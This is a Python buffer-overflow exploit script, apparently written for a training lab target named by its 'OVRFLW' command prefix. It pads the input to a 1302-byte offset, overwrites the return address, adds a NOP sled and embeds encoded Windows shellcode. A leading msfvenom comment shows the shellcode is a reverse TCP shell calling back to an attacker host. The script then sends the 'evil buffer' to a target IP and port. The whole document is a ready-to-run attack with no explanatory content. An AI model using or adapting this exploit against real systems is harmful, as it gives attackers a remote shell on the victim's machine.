#msfvenom -p windows/shell_reverse_tcp LHOST=10.2.112.246 LPORT=1234 EXITFUNC=thread -b "huaizifu" -f c
import socket

ip = "192.168.164.15"
port = 4455

prefix = "OVRFLW"
offset = 1302
overflow = "A" * offset
retn = "\x83\x66\x52\x56"
padding = "\x90"*16
payload = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x7b\x17\x92\xc8\x83\xee\xfc\xe2\xf4\x87\xff\x10\xc8\x7b\x17"
"\xf2\x41\x9e\x26\x52\xac\xf0\x47\xa2\x43\x29\x1b\x19\x9a\x6f"
"\x9c\xe0\xe0\x74\xa0\xd8\xee\x4a\xe8\x3e\xf4\x1a\x6b\x90\xe4"
"\x5b\xd6\x5d\xc5\x7a\xd0\x70\x3a\x29\x40\x19\x9a\x6b\x9c\xd8"
"\xf4\xf0\x5b\x83\xb0\x98\x5f\x93\x19\x2a\x9c\xcb\xe8\x7a\xc4"
"\x19\x81\x63\xf4\xa8\x81\xf0\x23\x19\xc9\xad\x26\x6d\x64\xba"
"\xd8\x9f\xc9\xbc\x2f\x72\xbd\x8d\x14\xef\x30\x40\x6a\xb6\xbd"
"\x9f\x4f\x19\x90\x5f\x16\x41\xae\xf0\x1b\xd9\x43\x23\x0b\x93"
"\x1b\xf0\x13\x19\xc9\xab\x9e\xd6\xec\x5f\x4c\xc9\xa9\x22\x4d"
"\xc3\x37\x9b\x48\xcd\x92\xf0\x05\x79\x45\x26\x7f\xa1\xfa\x7b"
"\x17\xfa\xbf\x08\x25\xcd\x9c\x13\x5b\xe5\xee\x7c\xe8\x47\x70"
"\xeb\x16\x92\xc8\x52\xd3\xc6\x98\x13\x3e\x12\xa3\x7b\xe8\x47"
"\x98\x2b\x47\xc2\x88\x2b\x57\xc2\xa0\x91\x18\x4d\x28\x84\xc2"
"\x05\xa2\x7e\x7f\x52\x60\xdf\x16\xfa\xca\x7b\x13\x40\x41\x9d"
"\x7d\x82\x9e\x2c\x7f\x0b\x6d\x0f\x76\x6d\x1d\xfe\xd7\xe6\xc4"
"\x84\x59\x9a\xbd\x97\x7f\x62\x7d\xd9\x41\x6d\x1d\x13\x74\xff"
"\xac\x7b\x9e\x71\x9f\x2c\x40\xa3\x3e\x11\x05\xcb\x9e\x99\xea"
"\xf4\x0f\x3f\x33\xae\xc9\x7a\x9a\xd6\xec\x6b\xd1\x92\x8c\x2f"
"\x47\xc4\x9e\x2d\x51\xc4\x86\x2d\x41\xc1\x9e\x13\x6e\x5e\xf7"
"\xfd\xe8\x47\x41\x9b\x59\xc4\x8e\x84\x27\xfa\xc0\xfc\x0a\xf2"
"\x37\xae\xac\x72\xd5\x51\x1d\xfa\x6e\xee\xaa\x0f\x37\xae\x2b"
"\x94\xb4\x71\x97\x69\x28\x0e\x12\x29\x8f\x68\x65\xfd\xa2\x7b"
"\x44\x6d\x1d")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")